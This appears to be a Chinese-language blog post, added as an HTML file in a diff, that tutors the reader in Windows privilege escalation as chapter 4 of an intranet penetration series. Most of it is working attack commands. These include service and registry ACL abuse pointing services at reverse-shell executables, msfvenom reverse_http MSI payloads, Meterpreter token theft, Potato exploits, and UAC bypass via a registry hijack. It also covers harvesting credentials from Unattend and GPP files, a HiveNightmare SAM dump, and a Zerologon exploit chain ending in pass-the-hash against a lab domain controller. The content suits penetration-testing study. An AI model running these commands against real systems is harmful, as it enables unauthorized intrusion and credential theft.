@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网渗透体系建设--第4章--权限提升 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.查找内核漏洞
+systeminfo收集本机补丁消息。
+1.1 wes-ng 查找可用漏洞：
+python3 wes.py --update
+
+python3 wes.py sysinfo.txt --impact &quot;Eleva..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网渗透体系建设--第4章--权限提升</h2>
+            <div class="post-date">2023-04-08</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-quan-xian-ti-sheng.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="1查找内核漏洞">1.查找内核漏洞</h1>
+<p><code>systeminfo</code>收集本机补丁消息。<br>
+<strong>1.1 wes-ng 查找可用漏洞：</strong></p>
+<pre><code>python3 wes.py --update
+
+python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;
+# --impact指定漏洞类型为提权漏洞
+
+python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only
+#查找有公开exp，结果后面附有链接
+</code></pre>
+<h1 id="2系统服务提权">2.系统服务提权</h1>
+<p>用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM权限启动。应用软件在注册服务时，在以下路径中创建相应的注册表项。</p>
+<pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
+
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
+#注册表下面有很多个表项, 每条表项分别对应一个服务, 默认情况下系统就有上百条系统服务表项数据, 查询本地安装服务表项数据:
+</code></pre>
+<p><code>注册表编辑器：regedit</code></p>
+<p><strong>2.1不安全的服务权限：</strong><br>
+ACL定义了安全对象的访问控制策略，用于规定那些主体对其拥有访问权限或其他权限。<br>
+windows的系统服务通过ACL来指定用户对其的权限。<br>
+<img src="https://dydydy123.github.io/post-images/1680934605756.png" alt="" loading="lazy"></p>
+<p>假如目标主机的用户在配置服务时存在疏忽，使低权限用户对高权限下运行的系统服务拥有更改服务配置的权限（SERVICE_QUERY_CONFIG 或 SERVICE_ALL_ACCESS），就可以通过低权限用户直接修改服务启动时的二进制文件路径。</p>
+<p>AccessChk可以枚举目标主机上存在权限缺陷的系统服务。<br>
+低权限用户可检查<code>INTERACTIVE</code>（所有经过身份验证的用户，包含系统中所有使用用户名，密码登录并通过验证的用户，不包括来宾账号）和<code>Authenticated Users</code>（交互式用户组，直接登录到计算机进行操作的用户）组对系统服务的权限。默认情况下，这两个组为计算机本地<code>USER</code>组的成员</p>
+<pre><code>accesschk64.exe /accepteula -uwcqv &quot;INTERACTIVE&quot; *    # 查询INTERACTIVE组可修改配置的服务
+accesschk64.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *    # 查询Authenticated Users组可修改配置的服务
+ 
+sc config &lt;Server Name&gt; &lt;BinfilePath Cloumn&gt;= &quot;cmd.exe /k &lt;EvilFilePath&gt;&quot;   # 修改服务启动文件为恶意文件路径/命令
+
+#sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;   #binpath=后面必须有一个空格
+ 
+#重启服务(需要SERVICE_STOP 或 SERVICE_START权限)，无权限可重启计算机。
+sc stop &lt;Service Name&gt;    
+sc start &lt;Service Name&gt;
+
+</code></pre>
+<p><strong>2.2不安全的服务注册表权限：</strong><br>
+Windows注册表中存储了每个系统服务的条目, 而注册表使用ACL来管理用户对其拥有的访问权限。<br>
+如果注册表ACL配置出错, 使低权限用户对服务的注册表有写入权限,因此可以通过修改注册表来修改服务配置</p>
+<p><code>不安全的服务提权是ACL权限配置错误导致服务配置修改权限分配到了低权限用户手中</code><br>
+<code>不安全的服务注册表项是ACL权限配置错误导致注册表表项修改权限分配到了低权限用户手中</code></p>
+<pre><code>accesschk64.exe /accepteula -uvwqk  &quot;INTERACTIVE&quot; HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services #查询当前用户具有写入权限的注册表项
+ 
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\&lt;Server Name&gt; /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k &lt;EvilFilePath&gt;&quot; /f    #修改注册表项的ImagePath字段(也可能是其他字段和类型,看具体的服务配置修改)
+ 
+ #查询用户组对服务是否有重启权限
+accesschk64.exe /accepteula -ucqv &quot;&lt;UserGroup Name&gt;&quot; &lt;Server Name&gt;    
+accesschk64.exe /accepteula -ucqv &quot;INTERACTIVE&quot; &lt;Server Name&gt;   
+accesschk64.exe /accepteula -ucqv &quot;Authenticated Users&quot; &lt;Server Name&gt;
+ 
+#重启服务
+sc stop &lt;Service Name&gt;    
+sc start &lt;Service Name&gt;
+</code></pre>
+<p><strong>2.3不安全的服务路径目录权限：</strong><br>
+如果一个低权限用户,对此服务调用的二进制文件所在目录具有写入权限,可将该文件替换为攻击载荷,并随着服务的启动继承系统权限.</p>
+<pre><code>accesschk64.exe /accepteula -quv &quot;&lt;ServerFilePath&gt;&quot;
+accesschk64.exe /accepteula -quv &quot;%SystemRoot%\system32\&quot;
+ #查看服务的二进制文件目录关于全部用户组的权限分配情况,如果接的是一个目录那就会分别列出该目录下全部目录和文件对各个用户组的权限分配情况
+accesschk64.exe /accepteula -quv &quot;&lt;ServerGroupName&gt;&quot; &quot;&lt;ServerFilePath&gt;&quot;
+ #查看服务的二进制文件目录关于指定用户组的权限分配情况
+ 
+ #重启计算机
+shutdown -r -t 0
+ 
+#重启服务
+sc stop &lt;Service Name&gt;    
+sc start &lt;Service Name&gt;
+</code></pre>
+<pre><code>利用：
+1.直接将二进制文件替换为恶意程序让系统以system权限执行完成提权
+
+2.在二进制文件目录下写入或者替换动态链接库文件进行dll劫持, system身份加载代码
+
+这种情况就是一个个服务慢慢找了
+
+从服务项注册表中找到全部服务程序所在目录路径
+检查Authenticated Users,INTERACTIVE,当前用户所在的其他用户组, 这三个用户组对文件夹目录是否有控制权限
+筛选出有控制权限的目录
+进入有控制权限的服务目录替换二进制文件或者dll文件
+这个要干的活稍微麻烦一点, 主要是要一个个服务查找到对应的二进制文件目录, 然后再检查当前用户对目录的控制权限是否有写入权限, 这点手工活不少, 不过可以参考下面未引用的服务路径直接wmic查看全部服务的PathName然后取出该字段, 再写个bat或ps脚本逐行执行上面accesschk64.exe用户组的权限检测, 最后输出满足要求的服务目录
+</code></pre>
+<p><strong>2.4不安全的未引用的服务路径：</strong><br>
+如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格，windows都会按照从左到又的顺序尝试寻找并执行与空格钱的名字相匹配的程序。</p>
+<pre><code>wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot; 
+#查询不带&quot;来指定二进制文件路径的服务
+ 
+accesschk64.exe /accepteula -quv &quot;&lt;UserGroupName&gt;&quot; &quot;&lt;DirFromServer&gt;&quot;    
+#查找带空格提前解析的目录有没有写入权限
+
+
+sc create &lt;servicename&gt; binpath=&quot;\&quot;path\&quot;&quot;
+#sc创建系统服务时，应有效的对存在空格的服务路径使用引号包裹。
+
+</code></pre>
+<h1 id="3powerup">3.PowerUp</h1>
+<pre><code>Set-ExecutionPolicy RemoteSigned
+Import-Module PowerUp.ps1
+invoke-allchecks
+</code></pre>
+<h1 id="4msi安装策略提权">4.MSI安装策略提权</h1>
+<p>MSI安装策略提权是由于用户配置MSI安装时启动了“永远以高特权进行安装”（默认禁用），使得任意权限的用户都能通过system权限安装MSI程序。此时测试人员可在目标主机上安装预先制作的MSI文件得到SYSTEM权限。</p>
+<p><strong>4.1确认系统是否存在漏洞</strong><br>
+关键在于用户启动“永远以高特权进行安装”选项后，系统会自动在注册表的以下两个位置创建键值“1”</p>
+<pre><code>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+</code></pre>
+<p>可通过以下命令查看值：</p>
+<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<p><strong>4.2 创建恶意MSI并安装</strong></p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_http LHOST=csServerIp LPORT=ListenPort -f msi -o reverse_tcp.msi    
+#生成反弹shell的msi安装程序
+ 
+msiexec /quiet /qn /i reverse_http_80.msi   
+#使用系统自带的安装应用msiexec运行msi程序，/quiet安装其间禁止向用户发送消息；/qn，无gui模式允许；/i常规安装
+</code></pre>
+<h1 id="5访问令牌操纵">5.访问令牌操纵</h1>
+<p>通常, 通过操纵访问令牌, 使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程. 这常常使用内置的API从指定的进程中复制访问令牌, 并将得到的访问令牌用户现有进程或新生成的进程/线程, 以达到权限提升并绕过访问控制的目的. 这个过程就成为令牌窃取.</p>
+<pre><code>Win32 API	说明
+OpenProcess	根据提供的进程id获取指定进程的句柄
+OpenProcesToken	获取与指定进程相关联的访问令牌的句柄
+DuplicateTokenEx	复制现有的访问令牌以创建一个新的访问令牌, 包括创建主令牌或模拟令牌
+ImPersonateLoggedOnUser	调用线程来模拟登录用户的访问令牌的安全上下文
+CreateProcessWithTokenW	创建一个新进程以及主线程, 新进程在指定令牌的安全上下文中运行
+CreateProcessAsUserA	创建一个新的进程以及主线程, 新进程在由指定令牌表示的用户的安全上下文中运行
+</code></pre>
+<p>令牌窃取只能在特权用户上下文中才能完成, 因为通过令牌创建进程使用的CreateProcessWithTokenW和CreateProcessAsUserA两个WindowsAPI分别要求用户必须拥有SeImpersonatePrivilege和SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege特权, 而拥有这两个特权的用户一般为系统管理员账户, 网络服务账户和系统服务账户(如IIS,MSSQL等)</p>
+<p><strong>5.2Metasploite窃取令牌</strong></p>
+<pre><code>load incognito          #导入incognito令牌窃取模块
+list_tokens -u          #查看可被1窃取令牌的用户
+impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;    #窃取账户令牌
+steal_token  &lt;PID&gt;        #从指定进程中窃取令牌
+</code></pre>
+<p><strong>5.3 通过令牌获取TrustedInstaller权限</strong></p>
+<p>在Windows系统中, SYSTEM是最高权限, 但是即便获取SYSTEM权限也不能修改Windows系统文件(例如C:\Windows\Servicing目录即便是SYSTEM权限也不能对其写入)</p>
+<pre><code>icacls &quot;C:\Windows\servicing&quot;  #查看目录的权限分配
+
+NT Serivice\TrustedInstaller账户对C:\Windows\servicing这个目录有完全控制的权限
+
+从WindowsVista开始系统内置了一个TrustedInstaller安全主体, 拥有修改系统文件权限, 专门对系统进行维护、更新等操作.TrustedInstaller以一个账户组的形式出现, 即NT Serivice\TrustedInstaller
+
+TrustedInstaller本身是一个服务, 在开启时会运行程序C:\Windows\servicing\TrustedInstaller.exe, 这个程序的拥有者为NT Serivice\TrustedInstaller所以测试人员可以通过窃取TrustedInstaller.exe程序的token以提升到TrustedInstaller权限
+
+</code></pre>
+<pre><code>#开启TrustedInstaller，记录pid
+sc start TrustedInstaller
+
+#获取指定pid令牌
+steal_token 1052
+
+#getuid还是SYSTEM但是可以向C:\Windows\servicing中写入文件，及获取了Serivice\TrustedInstaller用户令牌。
+upload /tmp/2.txt C:\\Windows\\servicing
+</code></pre>
+<h1 id="6potato-家族提权">6.Potato 家族提权</h1>
+<p><strong>6.1 Rotten Potato配合Metasploite窃取令牌</strong><br>
+Potato通过操纵访问令牌, 可以将已获取的windows服务账户权限提升到SYSTEM权限</p>
+<p>使用限制: 和token窃取一样, 需要用户有SeAssignPrimaryPrivilege或SeImpersonatePrivilege特权</p>
+<p>Potato家族正是通过滥用Windows服务账户拥有这两个特权权限, 将已获取的SYSTEM账户的访问令牌传入CreateProcessWithTokenW或CreateProcessAsUserA<br>
+<img src="https://dydydy123.github.io/post-images/1681118044541.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1681118053880.png" alt="" loading="lazy"><br>
+烂土豆的利用原理:</p>
+<p>通过GoGetInstanceFromIstorage API,将一个COM对象(BITS)加载到本地可控端口(TCP 6666), 并诱骗BITS对象以SYSTEM账户的身份向该端口发起NTLM验证<br>
+借助本地RPC 135端口, 对BITS对象的认证过程实施中间人攻击, 同时调用相关的API为SYSTEM账户在本地生成一个访问令牌</p>
+<pre><code>直接执行以下命令会发现没有SYSTEM
+load incognito
+list_tokens -u
+
+execute -cH -f &quot;rottenpotato.exe&quot;  #Meterpreter运行烂土豆程序
+ 
+load incognito #导入incognito模块用于窃取token
+list_tokens -u #查看当前可窃取的token(成功的话在执行rottenpotato之后可以看到SYSTEM可被窃取)
+impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #窃取SYSTEM用户token
+</code></pre>
+<p><strong>6.2 juicy Potato</strong><br>
+操作步骤：</p>
+<p>上传Juicy Potato的利用程序</p>
+<p>根据系统操作版本选择一个可用的COM对象</p>
+<p>这个步骤就是烂土豆的拓展, 在RottenPotato中默认选择的是BITS对象, 这个可用对象的CLSID根据脚本获得, 不同的系统有哪些SLID可以参考CLSID</p>
+<p>执行Juicy Potato程序加载可用的COM对象获取SYSTEM权限并运行指定payload程序反弹shell</p>
+<pre><code>#运行clsid.ps1将全部clsid输出到CLSID.list文件中
+powershell -ep bypass .\clsid.ps1 &gt; CLSID.list
+
+#可以将可用的CLSID全部输出到result.log文件中
+1.bat
+
+juicypotato.exe -t t -p shell.exe -l 6666 -n 135 -c {clsid}
+
+</code></pre>
+<p><code>clsid.ps1</code></p>
+<pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+	Write-Host $a.CLSID
+}
+</code></pre>
+<p><code>1.bat</code></p>
+<pre><code>@echo off
+:: Starting port, you can change it
+set /a port=9999
+SETLOCAL ENABLEDELAYEDEXPANSION
+
+FOR /F %%i IN (CLSID.list) DO (
+  echo %%i !port!
+  juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+  set RET=!ERRORLEVEL!
+  :: echo !RET!
+  if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)
+</code></pre>
+<p><strong>6.3 PrintSpoofer (Pipe Potato)</strong></p>
+<pre><code>PrintSpoofer64.exe -i -c whoami
+</code></pre>
+<p><strong>6.4 Sweet Potato</strong><br>
+集成工具含几种提权方式用于获取SYSTEM权限</p>
+<p>Rotten Potato<br>
+Juicy Potato<br>
+RogueWinRMPrintSpoofer</p>
+<p>链接：<br>
+https://github.com/CCob/SweetPotato</p>
+<h1 id="7bypass-uac">7.Bypass  UAC</h1>
+<p>介绍：</p>
+<p>用户帐户控制（User Account Control，简写作UAC)是微软公司从Windows Vista版本操作系统开始采用的一种控制机制。</p>
+<p>原理：<br>
+界面操作是：通过询问用户是否授权给应用程序，使用硬盘驱动器和系统文件的权力。以达到阻止恶意程序（“恶意软件”）损坏系统的效果。</p>
+<p>内部逻辑是：</p>
+<p>在触发 UAC 时，操作系统会创建一个consent.exe进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后creat process。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及，发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用CreateProcessAsUser函数，以管理员权限启动请求的进程。</p>
+<p>所以，病毒木马想要实现高权限操作，就不得不绕过UAC弹窗，在没有通知用户情况下, 悄悄地将普通权限，提升为管理员权限启动进程，从而使程序得到高权限的操作。</p>
+<p><strong>7.1白名单绕过UAC：</strong><br>
+<code>步骤</code></p>
+<pre><code>1.找到UAC白名单程序
+2.检查程序有没有什么我们可控的额外加载项(示例中ComputerDefault.exe默认加载HKCU\Software\Classes\ms-settings\shell\open\command注册表项程序)
+3.UAC程序加载的程序我们是否可控(上面的注册表普通用户权限就可以修改, 这点是很重要的,最佩服的就是示例中的作者能够发现这个一般权限可控的注册表)
+4.引导UAC程序加载我们的恶意程序拿到一个管理员会话
+5.使用管理员会话使用CS的csv-exe功能或者Meterpreter的getsystem程序拿到SYSTEM权限会话
+</code></pre>
+<p>白名单有个共同特点：就是Manifest中的autoElevate数据为true</p>
+<pre><code># 查找白名单程序
+sigcheck.exe -accepteula -m C:\Windows\System32\*.exe   
+#输出System32下面全部应用的Manifest数据
+strings.exe -accepteula -s C:\Windows\System32\*.exe |find /i &quot;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&quot;   
+#输出System32下面全部应用的Manifest数据过滤autoElevate为True的程序
+
+# ComputerDefault.exe默认程序应用+修改注册表提权demo:
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /d &quot;C:\temp/reverse_http_80.exe&quot; /f  
+#修改ComputerDefault加载的注册表指向的程序
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d &quot;C:\temp/reverse_http_80.exe&quot; /f 
+#修改ComputerDefault加载的注册表指向的程序
+ComputerDefault.exe 
+#执行程序,因为UAC白名单以管理员身份启动,然后加载注册表程序反弹管理员会话
+</code></pre>
+<p>这里使用process Monitor监听ComputerDefaults.exe,发现它会去查询HKCU\Software\Classes\ms-settings\Shell\Open\command里面的值。那么我们创建一个HKCU\Software\Classes\ms-settings\Shell\Open\command路径，再对ComputerDefaults.exe进行监听尝试，然后发现他还会去查询HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute，而且Result显示的是NAME NOT FOUND，那么可以认为首先去查询HKCU\Software\Classes\ms-settings\Shell\Open\command路径下的注册表，再去查询HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute是否存在。那么这里创建一个DelegateExecute的键值对，然后把默认键值对指向cmd程序进行尝试<br>
+<img src="https://dydydy123.github.io/post-images/1681196234310.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1681196591009.png" alt="" loading="lazy"></p>
+<p><strong>7.2.DLL劫持</strong><br>
+当应用加载DLL时，如果没有指出DLL的绝对路径，那么程序会在指定路径下搜索待加载的DLL，</p>
+<p>DLL动态链接库的搜索路径加载顺序：<br>
+在开启DLL安全搜索模式(XP SP2之后默认开启)的情况下:</p>
+<pre><code>程序安装目录
+系统目录(C:\Windows\System32)
+64位系统目录(C:\Windows\System)
+Windwos目录(C:\Windows)
+当前工作目录
+Path环境变量列出的目录
+</code></pre>
+<p>只要我们放置的dll程序在原本应加载的dll文件之前被加载到(dll文件需要同名), 就可以完成dll劫持, 但是一般这些目录我们都是不可写的, 所以需要结合模拟可信任目录进行利用。</p>
+<p><strong>7.3可信任目录</strong><br>
+UAC白名单程序请求自动提升权限的过程:</p>
+<pre><code>系统读取程序mainFest信息中的autoElevate属性字段值,如果为True则说明是可自动提升权限的程序
+系统检查程序的签名(这就意味着不能将UAC程序替换为paylaod程序)
+系统检查程序是否位于可信任目录中(如C:\Windows\System32目录)
+</code></pre>
+<p>为了绕过检查：</p>
+<pre><code>模拟可信任目录主要的攻击点就是在第三部可信任目录上, 
+例如上面提到C:\Windows\System32目录是一个可信任目录, 
+那么我们就可以使用一个`C:\Windows \System32目录作为模拟可信任目录(在Windows后面多了一个空格),
+原理就是在系统检查的时候会自动去处目录中的空格。
+</code></pre>
+<p>利用模拟可信任目录进行DLL劫持步骤：</p>
+<pre><code>1.strings列出SYSTEM32下的白名单程序
+2.检查白名单程序是否有调用DLL，使用Process monitor添加过滤规则
+(可以添加Process Name或者PID将其修改为对应的程序名或者PID)
+然后查看列表中出现的加载了的dll文件名(加载注册表的发现也可以通过这种方式寻找, 
+如果是寻找注册表方法的话难点就需要有扎实的注册表功底,
+ 需要知道哪些注册表是一般用户令牌即可修改才行, 或者最头铁的就是直接一个个reg /add语句测试了)
+3.将表名单程序赋值到虚拟可信任目录
+4.将构造好带有相同导出函数的DLL改名后放到复制后的同一目录下(可用ExportsToC++, AheadLib)
+5.运行虚拟可信任目录的白名单程序
+</code></pre>
+<p><strong>7.4 相关工具</strong></p>
+<p><code>7.4.1 UACME：</code><br>
+项目及其介绍：</p>
+<pre><code>克隆 UACME 项目到本地后，使用 VS2019 进行编译，然后运行即可。
+例如以下命令，表示使用 UACME 里的第 62 个方法进行 ByPassUAC，执行成功后，就会直接弹出管理员窗口，没有弹窗提示。
+akagi.exe [key] [param]  #key指定需要使用的方法编号;param指定绕过UAC之后执行的程序或命令,默认启动一个关闭UAC之后的CMD窗口
+
+https://github.com/Apri1y/UACME 
+18年的项目, 在README中详细介绍了47种利用方式以及它的可利用起止版本(里面的unfix看看就行, 
+还是要自己尝试, 毕竟项目比较老了)且有已编译好的exe可直接使用(但是一落地就会被杀, 
+倒是里面的工具UacInfo64.exe还挺好用的,
+ 直接列出CLSID的对象说明以及可以dll劫持的白名单程序)
+
+https://github.com/hfiref0x/UACME 
+17年的项目, 在README中的使用demo编号高达61,但是没有太多编号对应的漏洞介绍
+
+https://github.com/dotfornet/UACME 
+16年的项目, 在README中有23个利用方式,
+且对每个利用方式都要描述且说了从哪个版本(Fixed)
+</code></pre>
+<p><code>7.4.2 msf：</code><br>
+msf中集成了十几个可用的bypassuac模块, 直接通过search bypassuac即可搜索查看<br>
+成功利用后得到一个关闭了UAC保护的Meterpreter，如何执行getsystem命令可提权。<br>
+未绕过时：<br>
+<img src="https://dydydy123.github.io/post-images/1681222560845.png" alt="" loading="lazy"><br>
+以绕过时：<br>
+<img src="https://dydydy123.github.io/post-images/1681222687776.png" alt="" loading="lazy"></p>
+<h1 id="8用户凭据操作">8.用户凭据操作：</h1>
+<p><strong>8.1 枚举 Unattended 凭据：</strong></p>
+<pre><code>msfconsole
+use post/windows/gather/enum_unattend
+set session &lt;SessionID&gt;
+run
+</code></pre>
+<p>无人值守(Unattended)安装允许引用程序在不需要管理员关注下自动安装。<br>
+无人值守安装的问题可能会在系统中残留一些配置文件,<br>
+在里面有可能含有用户的账号和密码, 一般的配置残留文件有这些：</p>
+<pre><code>C:\sysprep.inf
+C:\syspreg\sysprep.xml
+C:\syspreg\system32\sysprep.inf
+C:\syspreg\system32\sysprep\sysprep.xml
+ 
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+ 
+C:\Windows\system32\Sysgrep\Unattend.xml
+C:\Windows\system32\Sysgrep\Panther\Unattend.xml
+</code></pre>
+<p><strong>8.2 获取组策略凭据：</strong></p>
+<pre><code>msfconsole
+use /windows/gather/credentials/gpp
+set session &lt;sessionID&gt;
+run
+</code></pre>
+<p>微软在Windows Server 2008 中引入了组策略首选项, 允许网络管理员对指定计算机和用户配置特定的设置</p>
+<p>在新建一个组后, 控制器会在SYYVOL共享目录下生成一个xml文件, 改文件保留了组策略更新后的密码。</p>
+<p><code>SYSVOL是在安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹, 主要存放登录脚本,组策略数据以及其他域控制器需要的域信息等, 并在所有结果身份验证的域用户或者域信任用户范围内共享</code></p>
+<p>在SYSVOL目录中可以找到一个名为Groups.xml的文件,其中的cpassword字段保存了经过AES 256加密后的用户密码, 微软在2012年公布了加密秘钥, 这就意味着域内用户都可以读取Groups.xml中的密码并使用公开的秘钥进行解密。且由于通过组策略批量修改的本地管理员密码都是相同的, 这就意味着拿到一台机器的本地管理员密码就拿到了域控账户进而通过域管账户拿下整个域。</p>
+<p><strong>8.3HiveNightmare</strong></p>
+<pre><code>#执行漏洞程序导出有关SAM的三个表
+HiveNightmare.exe 
+
+#从导出的SAM中拿到用户哈希
+python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL  
+</code></pre>
+<p>2021年7月公布漏洞(CVE-2021-36934), 由于Windows中多个系统文件的访问控制表(ACL)过于宽松,使得任何标准用户都可以从系统影卷副本中读取包括SAM、SYSETM、SECURITY在内的多个系统文件。拿到这几个文件之后就可以进行本地破解,拿到用户的NTLM hash进行PTH攻击或者直接本地爆破密码。</p>
+<p>该漏洞影响WIN10 Version 1809发布以来的所有Windows版本,包括Windows11, 被称为HiveNightmare</p>
+<p>漏洞利用条件有两个:<br>
+<code>系统保护开启(默认开启)</code><br>
+<code>系统中创建有还原点</code><br>
+三个系统文件位置为:</p>
+<pre><code>C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SECURITY
+</code></pre>
+<p>查看是否存在漏洞：<br>
+标准用户执行：</p>
+<pre><code>icacls C:\Windows\System32\config\SAM
+
+若存在漏洞输出：“BUILTIN\Users:(I)(RX)”
+</code></pre>
+<p>先下载HiveNightmare.exe然后上传到靶机中然后直接执行就会在当前目录输出SAM,SYSTEM,SECURITY三个文件(exe上去就直接被杀, 但是HiveNightmare项目里的ps文件就没报报毒)使用Impacket项目中的secretsdump.py导出SAM中的哈希值</p>
+<pre><code>python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL
+</code></pre>
+<p><strong>8.4 Zerologon 域内提权</strong></p>
+<p>Zerologon(CVE-2020-1472)是Netlogon远程协议的一个特权漏洞的提升, 可以在不提供任何凭据的情况下通过身份验证, 实现域内提权。</p>
+<p>漏洞常见的利用方法就是调用Netlogon中的RPC函数NetrServerPasswordSet2来重置域控制器账户的密码。注意这里重置的是DC机器账户密码(详细的域内用户组参考域内信息收集,这里的机器账户就是域成员主机组内的账户Domain Computers), 这个域控制器主机账户密码由系统随机生成(密码强度是120字符,且会定时更新).</p>
+<p>在域内的机器账户以机器名+$也是一种域用户, 它是不允许登录的, 所以不能直接进行远程登录域控制器, 但是域控制器的机器账户在默认下拥有DCSync权限, 因此可以通过DCSync攻击导出域管理员密码的哈希, 从而获取域控权限。</p>
+<p><code>密码重置为空:</code><br>
+可以到项目CVE-2020-1472获取poc文件:</p>
+<p>运行cve-2020-1472-exploit.py 将域控制器密码重置为空</p>
+<pre><code>python3 cve-2020-1472-exploit.py [DCName] [DCIP]
+python3 cve-2020-1472-exploit.py owa 192.168.52.138 
+
+使用secretsdump.py以空密码连接上域控, 并导出管理员哈希值
+python3 secretsdump.py god.org/owa\$@192.168.52.138 -just-dc-user &quot;god\administrator&quot; -no-pass 
+
+拿到管理员哈希之后对域控制器执行PTH哈希传递攻击, 利用成功则获取到域控的SYSTEM权限
+python3 psexec.py god.org/administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:8a963371a63944419ec1adf687bb1be5
+</code></pre>
+<p><img src="https://dydydy123.github.io/post-images/1681277890374.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1681277896960.png" alt="" loading="lazy"></p>
+<p>这里的cve-2020-1472-exploit.py和secretsdump.py因为考虑到靶机上可能没有python,即使有python也不一定有需要的依赖, 所以我就直接在本地使用pyinstaller将.py打包为.exe方便直接上传后运行</p>
+<pre><code>python -m pip install --upgrade pip
+python -m pip install pyinstaller
+Python -m pip install impacket
+ 
